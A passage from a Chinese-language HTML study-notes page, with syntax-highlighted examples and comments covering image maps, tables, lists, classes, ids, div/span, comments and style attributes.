punctuation\">\"</span>/example/html/sun.html<span class=\"token punctuation\">\"</span></span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre><span class=\"token attr-name\">target</span> <span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>_blank<span class=\"token punctuation\">\"</span></span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre><span class=\"token attr-name\">alt</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>Sun<span class=\"token punctuation\">\"</span></span> <span class=\"token punctuation\">/></span></span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre></pre></td></tr><tr><td data-num=\"34\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>map</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre></pre></td></tr><tr><td data-num=\"36\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>p</span><span class=\"token punctuation\">></span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>b</span><span class=\"token punctuation\">></span></span>注释：<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>b</span><span class=\"token punctuation\">></span></span>img 元素中的 \"usemap\" 属性引用 map 元素中的 \"id\" 或 \"name\" 属性（根据浏览器），所以我们同时向 map 元素添加了 \"id\" 和 \"name\" 属性。<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>p</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre></pre></td></tr><tr><td data-num=\"38\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>body</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>html</span><span class=\"token punctuation\">></span></span></pre></td></tr></table></figure><h6 id=\"4表格table\"><a class=\"anchor\" href=\"#4表格table\">#</a> 4. 表格 (table)</h6>\n<figure class=\"highlight html\"><figcaption data-lang=\"HTML\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>table</span> <span class=\"token attr-name\">border</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>1<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span> </pre></td></tr><tr><td data-num=\"2\"></td><td><pre>//有background属性，同插入背景图像的写法，不在style里</pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>tr</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>th</span><span class=\"token punctuation\">></span></span>Heading<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>th</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>th</span><span class=\"token punctuation\">></span></span>Another Heading<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>th</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>td</span><span class=\"token punctuation\">></span></span>row 1, cell 1<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>td</span><span class=\"token punctuation\">></span></span> //有background属性，同上。也有align,同样不在</pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>td</span><span class=\"token punctuation\">></span></span>row 1, cell 2<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>td</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>tr</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>tr</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>td</span><span class=\"token punctuation\">></span></span>row 2, cell 1<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>td</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>td</span><span class=\"token punctuation\">></span></span>row 2, cell 2<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>td</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>tr</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>table</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>//tr定义行（之间为一行）</pre></td></tr><tr><td data-num=\"15\"></td><td><pre>//td分割行形成单元格（之间的为数据可以是文本、图片、列表、段落、表单、水平   线、表格等等(普通，左对齐)</pre></td></tr><tr><td data-num=\"16\"></td><td><pre>//th是表头(居中粗体，就是不会动的那个，自带td)</pre></td></tr><tr><td data-num=\"17\"></td><td><pre>//border为1时有边框，默认为0</pre></td></tr><tr><td data-num=\"18\"></td><td><pre>//有时空单不会显示，缺少单元格边框，可以填个空格（&amp;nbsp）来防止</pre></td></tr><tr><td data-num=\"19\"></td><td><pre>//表格的单元格里可以嵌套表格，列表</pre></td></tr><tr><td data-num=\"20\"></td><td><pre>#table的其他参数有：</pre></td></tr><tr><td data-num=\"21\"></td><td><pre>frame(分割线的位置)：box,above,below,hsides(上下)，vsides(左右)</pre></td></tr><tr><td data-num=\"22\"></td><td><pre>cellpadding/cellspacing：单元格边距/间距，参数只有数字</pre></td></tr></table></figure><p>th 的参数：colspan=&quot;x&quot;, 横跨 x 列</p>\n<p>​                   rowspan=&quot;x&quot;, 横跨 x 行</p>\n<p>其他表格标签：</p>\n<p><a href=\"%E6%A0%87%E9%A2%98%EF%BC%8C%E5%8F%AA%E8%83%BD%E6%9C%89%E4%B8%80%E4%B8%AA%EF%BC%8C%E8%87%AA%E5%8A%A8%E5%B1%85%E4%B8%AD%EF%BC%8C%E4%BD%86%E5%8F%AF%E4%BB%A5%E7%94%A8css%E5%B1%9E%E6%80%A7\">&lt;caption&gt;</a>，<a href=\"%E9%A1%B5%E7%9C%89,%E9%A1%B5%E8%84%9A,%E6%AD%A3%E6%96%87%E3%80%82%E4%B9%9F%E5%B0%B1%E6%98%AF%EF%BC%9A%E5%89%8D%E5%87%A0%E8%A1%8C%EF%BC%8C%E5%90%8E%E5%87%A0%E8%A1%8C%EF%BC%8C%E4%B8%AD%E9%97%B4%E3%80%82%E6%BB%9A%E5%8A%A8%E6%97%B6,%E9%A1%B5%E7%9C%89%E5%92%8C%E9%A1%B5%E8%84%9A%EF%BC%88%E4%B8%A4%E8%80%85%E9%83%BD%E8%87%B3%E5%B0%91%E5%BE%97%E5%90%AB%E4%B8%80%E5%AF%B9tr%EF%BC%89%E9%83%BD%E4%B8%8D%E4%BC%9A%E5%8A%A8\">&lt;thead&gt; 与 &lt; tfoot &gt; 还有 &lt; tbody&gt;</a>，<a href=\"%E7%94%A8%E4%BA%8E%E5%AE%9A%E4%B9%89%E5%88%97%E7%9A%84%E5%B1%9E%E6%80%A7%EF%BC%8C%E4%BD%86%E6%98%AF%E6%88%91%E7%9C%8B%E4%B8%8D%E6%87%82\">&lt;col&gt; 和 &lt; colgroup&gt;</a></p>\n<h6 id=\"5列表ulol\"><a class=\"anchor\" href=\"#5列表ulol\">#</a> 5. 列表 (ul/ol)</h6>\n<p>A. 无序列表</p>\n<figure class=\"highlight html\"><figcaption data-lang=\"HTML\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>ul</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>  <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>li</span><span class=\"token punctuation\">></span></span>咖啡<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>li</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>  <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>li</span><span class=\"token punctuation\">></span></span>茶<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>li</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>  <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>li</span><span class=\"token punctuation\">></span></span>牛奶<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>li</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>ul</span><span class=\"token punctuation\">></span></span>              //每行前面一个点的那种</pre></td></tr></table></figure><p>B. 无序列表</p>\n<figure class=\"highlight html\"><figcaption data-lang=\"HTML\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>ol</span> <span class=\"token attr-name\">start</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>50<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>  <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>li</span><span class=\"token punctuation\">></span></span>咖啡<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>li</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>  <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>li</span><span class=\"token punctuation\">></span></span>牛奶<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>li</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>  <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>li</span><span class=\"token punctuation\">></span></span>茶<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>li</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>ol</span><span class=\"token punctuation\">></span></span>            //start属性就是第一个排序数字，默认从1开始</pre></td></tr></table></figure><h6 id=\"6类\"><a class=\"anchor\" href=\"#6类\">#</a> 6. 类</h6>\n<p>将 html 元素分成各个类，并按类分别定义不同样式（可以使用 CSS 样式）</p>\n<p>比如：</p>\n<figure class=\"highlight html\"><figcaption data-lang=\"HTML\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>html</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>head</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>style</span><span class=\"token punctuation\">></span></span><span class=\"token style\"><span class=\"token language-css\"></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token selector\">.cities</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    <span class=\"token property\">background-color</span><span class=\"token punctuation\">:</span>black<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    <span class=\"token property\">color</span><span class=\"token punctuation\">:</span>white<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    <span class=\"token property\">margin</span><span class=\"token punctuation\">:</span>20px<span class=\"token punctuation\">;</span>     //（设定）外边距，可以使用百分比</pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    <span class=\"token property\">padding</span><span class=\"token punctuation\">:</span>20px<span class=\"token punctuation\">;</span>    //填充（边距），可以使用百分比</pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token punctuation\">&#125;</span> </pre></td></tr><tr><td data-num=\"10\"></td><td><pre></span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>style</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>head</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>body</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>div</span> <span class=\"token attr-name\">class</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>cities<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>h2</span><span class=\"token punctuation\">></span></span>London<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>h2</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>p</span><span class=\"token punctuation\">></span></span>London is the capital city of England. </pre></td></tr><tr><td data-num=\"18\"></td><td><pre>It is the most populous city in the United Kingdom, </pre></td></tr><tr><td data-num=\"19\"></td><td><pre>with a metropolitan area of over 13 million inhabitants.<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>p</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>div</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre></pre></td></tr><tr><td data-num=\"22\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>div</span> <span class=\"token attr-name\">class</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>cities<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>h2</span><span class=\"token punctuation\">></span></span>Paris<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>h2</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>p</span><span class=\"token punctuation\">></span></span>Paris is the capital and most populous city of France.<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>p</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>div</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre></pre></td></tr><tr><td data-num=\"27\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>div</span> <span class=\"token attr-name\">class</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>cities<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>h2</span><span class=\"token punctuation\">></span></span>Tokyo<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>h2</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>p</span><span class=\"token punctuation\">></span></span>Tokyo is the capital of Japan, the center of the Greater Tokyo Area,</pre></td></tr><tr><td data-num=\"30\"></td><td><pre>and the most populous metropolitan area in the world.<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>p</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>div</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre></pre></td></tr><tr><td data-num=\"33\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>body</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>html</span><span class=\"token punctuation\">></span></span></pre></td></tr></table></figure><p>自己看咯～跟下面块的一样，方便搞类似的样式内容</p>\n<h6 id=\"7id\"><a class=\"anchor\" href=\"#7id\">#</a> <a href=\"http://7.id\">7.id</a></h6>\n<p>与 class 不同，它必需是唯一的，这涉及到 js</p>\n<p>位于文件头的 &lt;style&gt; 与 &lt;/style&gt;&gt; 中，格式：</p>\n<figure class=\"highlight html\"><figcaption data-lang=\"HTML\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>#myHeader &#123;</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>  background-color: lightblue;</pre></td></tr><tr><td data-num=\"3\"></td><td><pre>  color: black;</pre></td></tr><tr><td data-num=\"4\"></td><td><pre>  padding: 40px;</pre></td></tr><tr><td data-num=\"5\"></td><td><pre>  text-align: center;</pre></td></tr><tr><td data-num=\"6\"></td><td><pre>&#125;               //id名和值在在该html中必须唯一，区分大小写</pre></td></tr></table></figure><p>后面属性就可以直接调用该 id，比如：</p>\n<figure class=\"highlight html\"><figcaption data-lang=\"HTML\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>h1</span> <span class=\"token attr-name\">id</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>myHeader<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span>My Header<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>h1</span><span class=\"token punctuation\">></span></span></pre></td></tr></table></figure><p>id 还可以创建书签：</p>\n<figure class=\"highlight html\"><figcaption data-lang=\"HTML\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>h2</span> <span class=\"token attr-name\">id</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>C4<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span>第四章<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>h2</span><span class=\"token punctuation\">></span></span>   //创建</pre></td></tr></table></figure><figure class=\"highlight html\"><figcaption data-lang=\"HTML\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>a</span> <span class=\"token attr-name\">href</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>#C4<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span>跳转到第四章<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>a</span><span class=\"token punctuation\">></span></span>   //html内部使用跳转</pre></td></tr></table></figure><figure class=\"highlight html\"><figcaption data-lang=\"HTML\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>a</span> <span class=\"token attr-name\">href</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>html_demo.html#C4<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span>Jump to Chapter 4<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>a</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>//从另一页面跳转</pre></td></tr></table></figure><h6 id=\"8块divspan\"><a class=\"anchor\" href=\"#8块divspan\">#</a> 8. 块 (div/span)</h6>\n<p>// 这两者本身没有什么意义，可以用 CSS 来样式设置</p>\n<p>HTML 元素分为块级元素和内联元素两种：</p>\n<p>块级元素在浏览器显示时，通常会以新行来开始或结束 // &lt;h1&gt;, &lt;p&gt;, &lt;ul&gt;, &lt;table&gt;</p>\n<p>内联元素在显示时通常不会以新行开始 // &lt;b&gt;, &lt;td&gt;, &lt;a&gt;, &lt;img&gt;</p>\n<p>A.&lt;div&gt;(块级元素)</p>\n<p>&lt;div&gt; 标签定义 HTML 文档中的分割或部分（分区或小节，division/section）。</p>\n<p>&lt;div&gt; 标签可以把文档分割为独立的、不同的部分。它可以用作严格的组织工具，并且不使用任何格式与其关联</p>\n<p>任何类型的内容都可以放在标签内！标签可用作 HTML 元素的容器，然后使用 CSS 设置样式或使用 JavaScript 进行操作。</p>\n<p>如果用 id 或 class 来标记 &lt;div&gt;，那么该标签的作用会变得更加有效。通过使用 class 或 id 属性，可以轻松地对 &lt;div&gt; 标签设置样式。</p>\n<p>注意：默认情况下，浏览器总是在 &lt;div&gt; 元素前后放置一个换行符。</p>\n<p>&lt;div&gt; 是块级元素。这意味着它的内容自动地开始一个新行。实际上，换行是 &lt;div&gt; 固有的唯一格式表现。可以通过 &lt;div&gt; 的 class 或 id 应用额外的样式。</p>\n<p>属性：</p>\n<p>class 用于元素组（某一类元素），而 id 标识唯一元素</p>\n<p>比如：</p>\n<figure class=\"highlight html\"><figcaption data-lang=\"HTML\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>div</span> <span class=\"token attr-name\">class</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>myDiv<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>  <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>h2</span><span class=\"token punctuation\">></span></span>这是 div 元素中的标题<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>h2</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>  <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>p</span><span class=\"token punctuation\">></span></span>这是 div 元素中的一些文本。<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>p</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>div</span><span class=\"token punctuation\">></span></span>        //定义方法同id，但是前面的#换成.</pre></td></tr></table></figure><p>B.&lt;span&gt;(内联元素)</p>\n<p>&lt;p&gt; 这位姑娘有一双 &lt; span style=&quot;color:blue;font-weight:bold&quot;&gt; 蓝色 &lt;/span &gt; 的眼睛。&lt;/p&gt;    :: 其实就是给行内部分加 style，div 则是为多行加上 style</p>\n<h6 id=\"x注释\"><a class=\"anchor\" href=\"#x注释\">#</a> x. 注释</h6>\n<p>&lt;!-- This is a comment --&gt;</p>\n<p>也有条件注释：&lt;!--[if IE 8]&gt;   xxx   &lt;![endif]--&gt;</p>\n<p>// 这表示只在 IE 显示</p>\n<hr />\n<h4 id=\"2语法\"><a class=\"anchor\" href=\"#2语法\">#</a> 2. 语法</h4>\n<ul>\n<li><strong>HTML 元素以<em>开始标签</em>起始</strong></li>\n<li><strong>HTML 元素以<em>结束标签</em>终止</strong></li>\n<li><em>元素的内容</em>是开始标签与结束标签之间的内容</li>\n<li>某些 HTML 元素具有空内容 (没有内容的 HTML 元素被称为空元素)</li>\n<li>[空元素]( 没有内容的 HTML 元素被称为空元素。空元素是在开始标签中关闭的。 在 XHTML、XML 以及未来版本的 HTML 中，所有元素都必须被关闭。 在开始标签中添加斜杠，比如 &lt;br /&gt;，是关闭空元素的正确方法，HTML、XHTML 和 XML 都接受这种方式 。 即使 &lt;br&gt; 在所有浏览器中都是有效的，但使用 &lt;br /&gt; 其实是更长远的保障。   ) 在开始标签中关闭 ，以开始标签的结束而结束</li>\n<li>大多数 HTML 元素可拥有<em>属性</em></li>\n</ul>\n<p>// 大多 html 可以嵌套</p>\n<p>比如：&lt;p&gt;This is&lt;br /&gt;a para&lt;br /&gt;graph with line breaks&lt;/p&gt;</p>\n<h5 id=\"属性\"><a class=\"anchor\" href=\"#属性\">#</a> 属性</h5>\n<p>#必须加引号</p>\n<p>[# 参考手册](完整的：<a href=\"https://www.w3school.com.cn/tags/index.asp\">https://www.w3school.com.cn/tags/index.asp</a>           标准属性的：<a href=\"https://www.w3school.com.cn/tags/html_ref_standardattributes.asp\">https://www.w3school.com.cn/tags/html_ref_standardattributes.asp</a>)</p>\n<p>总是以名称 / 值对的形式出现，比如：<em>name=&quot;value&quot;</em>。（像是上面的 &lt;a&gt;）</p>\n<p>总是在 HTML 元素的<em>开始标签</em>中规定。</p>\n<p>比如：</p>\n<pre><code>&lt;h1&gt; 定义标题的开始。\n\n&lt;h1 align=&quot;center&quot;&gt; 拥有关于对齐方式的附加信息。\n</code></pre>\n<pre><code>&lt;h1&gt; 定义标题的开始。\n\n&lt;h1 align=&quot;center&quot;&gt; 拥有关于对齐方式的附加信息。\n</code></pre>\n<pre><code>&lt;body&gt; 定义 HTML 文档的主体。\n\n&lt;body bgcolor=&quot;yellow&quot;&gt; 拥有关于背景颜色的。\n</code></pre>\n<pre><code>&lt;table&gt; 定义HTML表格\n&lt;table border=&quot;1&quot;&gt; 拥有关于表格边框的附加信息\n</code></pre>\n<h6 id=\"1style\"><a class=\"anchor\" href=\"#1style\">#</a> 1.style</h6>\n<table>\n<thead>\n<tr>\n<th>align</th>\n<th>定义文本的对齐方式</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td><strong>bgcolor</strong></td>\n<td><strong>定义背景颜色</strong></td>\n</tr>\n<tr>\n<td><strong>color</strong></td>\n<td><strong>定义文本颜色</strong></td>\n</tr>\n</tbody>\n</table>\n<p>写成</p>\n<figure class=\"highlight html\"><figcaption data-lang=\"HTML\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>body</span> <span class=\"token special-attr\"><span class=\"token attr-name\">style</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span><span class=\"token value css language-css\"><span class=\"token property\">background-color</span><span class=\"token punctuation\">:</span>yellow</span><span class=\"token punctuation\">\"</span></span></span><span class=\"token punctuation\">></span></span>  //设置背景色</pre></td></tr></table></figure><figure class=\"highlight html\"><figcaption data-lang=\"HTML\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>h2</span> <span class=\"token special-attr\"><span class=\"token attr-name\">style</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span><span class=\"token value css language-css\"><span class=\"token property\">background-color</span><span class=\"token punctuation\">:</span>red</span><span class=\"token punctuation\">\"</span></span></span><span class=\"token punctuation\">></span></span>This is a heading<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>h2</span><span class=\"token punctuation\">></span></span> //同上</pre></td></tr></table></figure><figure class=\"highlight html\"><figcaption data-lang=\"HTML\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>p</span> <span class=\"token special-attr\"><span class=\"token attr-name\">style</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span 